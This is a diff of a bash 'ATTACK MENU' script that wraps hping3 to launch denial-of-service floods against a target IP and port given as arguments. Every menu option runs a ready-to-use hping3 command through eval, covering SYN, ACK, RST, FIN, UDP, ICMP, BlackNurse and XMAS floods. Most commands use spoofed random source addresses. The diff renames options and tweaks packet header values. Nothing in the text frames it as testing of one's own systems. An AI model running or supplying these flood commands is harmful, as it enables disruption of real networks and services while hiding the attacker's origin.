@@ -5,7 +5,7 @@ hping='/usr/sbin/hping3'
 echo "*** ATTACK MENU ***"
 echo "******************"
 echo ""
-#IP="10.128.10.50"
+
 IP=$1
 if [ "$IP" == "" ]
  then
@@ -22,9 +22,9 @@ fi
 
 echo "Target: $IP:$PORT"
 echo ""
-#PORT="80"
-ATTACK='Please enter your choice: '
-options=("SYN-Flood" "PUSH-Flood" "Push/Ack-Flood" "Push/Ack-Flood-TS" "SYN/ACK-Flood" "SYN/ACK-TS-Flood" "ICMP-Flood" "vol-ICMP-Flood" "ACK-Flood" "ACK-Flood-TS" "ACK-Flood-single_source" "RST-Flood" "FIN-Flood" "UDP-Flood" "vol_UDP-Flood" "frag-UDP-Flood" "BN1" "BN2" "BN3" "BN4" "X-MAS-Flood" "Y-MAS-Flood" "Quit")
+ATTACK='Please chose your attack: '
+options=("SYN-Flood" "PUSH-Flood" "Push/Ack-Flood" "Push/Ack-Flood-with-Timestamp" "SYN/ACK-Flood" "SYN/ACK-Flood-with-Timestamp" "ACK-Flood" "ACK-Flood-with-Timestamp" "ACK-Flood-single_source" "RST-Flood" "FIN-Flood" "UDP-Flood" "UDP-Flood-volumetric" "UDP-Flood-fragmented" "ICMP-Flood" "ICMP-Flood-volumetric" "BlackNurse1" "BlackNurse2" "BlackNurse3" "BlackNurse4" "X-MAS-Flood" "Y-MAS-Flood" "Quit")
+#options=("SYN-Flood" "PUSH-Flood" "Push/Ack-Flood" "Push/Ack-Flood-with-Timestamp" "SYN/ACK-Flood" "SYN/ACK-Flood-with-Timestamp" "ICMP-Flood" "ICMP-Flood-volumetric" "ACK-Flood" "ACK-Flood-with-Timestamp" "ACK-Flood-single_source" "RST-Flood" "FIN-Flood" "UDP-Flood" "UDP-Flood-volumetric" "UDP-Flood-fragmented" "BlackNurse1" "BlackNurse2" "BlackNurse3" "BlackNurse4" "X-MAS-Flood" "Y-MAS-Flood" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -39,22 +39,22 @@ do
 		eval $cmd
                 ;;
         "Push/Ack-Flood")
-                cmd="$hping -PA -p $PORT $IP --flood --rand-source --tos 33 --ttl 74 -d 54"
+                cmd="$hping -PA -p $PORT $IP --flood --rand-source --tos 23 --ttl 44 -d 12"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
-        "Push/Ack-Flood-TS")
-		cmd="$hping -PA -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 33 --ttl 74 -d 54"
+        "Push/Ack-Flood-with-Timestamp")
+		cmd="$hping -PA -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 78 --ttl 43 -d 37"
 		echo "Running: "$cmd
                 eval $cmd
                 ;;
 	"SYN/ACK-Flood")
-		cmd="$hping -SA -p $PORT $IP --flood --rand-source --tos 32 --ttl 74 -d 54"
+		cmd="$hping -SA -p $PORT $IP --flood --rand-source --tos 12 --ttl 39 -d 90"
 		echo "Running: "$cmd
                 eval $cmd
 		;;	
-	"SYN/ACK-TS-Flood")
-		cmd="$hping -SA --tcp-timestamp -p $PORT $IP --flood --rand-source --tos 32 --ttl 74 -d 54"
+	"SYN/ACK-Flood-with-Timestamp")
+		cmd="$hping -SA --tcp-timestamp -p $PORT $IP --flood --rand-source --tos 67 --ttl 134 -d 53"
 		echo "Running: "$cmd
                 eval $cmd
 		;;
@@ -63,23 +63,23 @@ do
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
-        "vol-ICMP-Flood")
+        "ICMP-Flood-volumetric")
                 cmd="$hping --icmp -i u1 -d 1300 $IP --rand-source"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
         "ACK-Flood")
-                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tos 27 --ttl 122 -d 99"
+                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tos 28 --ttl 124 -d 98"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
-        "ACK-Flood-TS")
-                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 27 --ttl 122 -d 99"
+        "ACK-Flood-with-Timestamp")
+                cmd="$hping --ack -p $PORT $IP --flood --rand-source --tcp-timestamp --tos 27 --ttl 132 -d 91"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
         "ACK-Flood-single_source")
-                cmd="$hping --ack -p $PORT $IP --flood -a 10.103.1.104  --tos 27 --ttl 122 -d 99"
+                cmd="$hping --ack -p $PORT $IP --flood -a 10.103.1.104  --tos 77 --ttl 167 -d 80"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
@@ -98,32 +98,32 @@ do
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
-        "vol_UDP-Flood")
+        "UDP-Flood-volumetric")
                 cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source --data 1400"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
-        "frag-UDP-Flood")
+        "UDP-Flood-fragmented")
                 cmd="$hping --flood --rand-source --udp $IP -p $PORT --rand-source -x"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
-        "BN1")
+        "BlackNurse1")
                 cmd="$hping --icmp -C 3 -K 0 --flood $IP --rand-source"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
-        "BN2")
+        "BlackNurse2")
                 cmd="$hping --icmp -C 3 -K 3 --flood $IP --rand-source"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
-        "BN3")
+        "BlackNurse3")
                 cmd="$hping --icmp -C 8 -K 0 --flood $IP --rand-source"
 		echo "Running: "$cmd
 		eval $cmd
                 ;;
-        "BN4")
+        "BlackNurse4")
                 cmd="$hping --icmp -C 8 -K 3 --flood $IP --rand-source"
 		echo "Running: "$cmd
 		eval $cmd
